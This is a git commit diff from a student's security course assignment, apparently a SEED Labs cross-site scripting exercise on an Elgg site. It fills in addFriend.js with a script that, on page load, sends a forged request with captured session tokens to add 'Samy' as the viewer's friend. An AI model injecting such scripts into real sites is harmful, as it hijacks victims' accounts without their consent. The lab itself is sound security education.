a80142a98ef14617670852778a84ef9d6446be99
arensagun2 <arenjosiah.sagun001@umb.edu>
2023-10-28 04:17:13 -0400

    finished cs449-assignment 2

--- cs/cs449/assignment-2/Q2/addFriend.js
+++ cs/cs449/assignment-2/Q2/addFriend.js
@@ -3,7 +3,7 @@ window.onload = function () {
     var Ajax=null;
     // XXXX is to be filled with a URL that 
     // triggers the request to add Samy as a friend
-    var sendurl=XXXX
+    var sendurl="http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1698477014&__elgg_token=QldVZFn_gZRiBGtY6egDAg";
     Ajax=new XMLHttpRequest();
     Ajax.open("GET", sendurl, true);
     Ajax.send();
